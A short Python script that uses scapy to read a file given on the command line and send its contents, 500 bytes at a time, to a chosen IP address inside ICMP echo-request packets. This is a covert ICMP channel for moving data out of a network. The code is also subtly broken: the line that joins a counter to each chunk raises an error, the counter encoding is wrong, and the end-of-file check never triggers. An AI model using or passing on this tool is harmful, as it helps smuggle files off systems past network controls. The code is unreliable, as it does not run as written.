from urllib import request
from scapy import main
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR,DNSRR
from scapy.layers.inet import IP, UDP, ICMP
import sys


def main(ip,file):
    
    last_sent = 0
    data_to_send =b""
    count = 0
    
    while True:
        with open(file,"rb") as f:
            f.seek((255*  count + last_sent)*500)
            file_data = f.read(500)
            if file_data is None:
                data_to_send = b""
                break
            else:
                last_sent += 1
                data_to_send = bytes(last_sent)++file_data
        
        packet = IP(dst = ip) / ICMP(type="echo-request") / Raw(data_to_send)
        recived = sr1(packet)
        data_recived = recived[Raw].load
        last_sent = int(data_recived[0])
        
        if last_sent==255:
            last_sent=0
            count += 1
        
    

if __name__ == "__main__":
    main(sys.argv[1],sys.argv[2])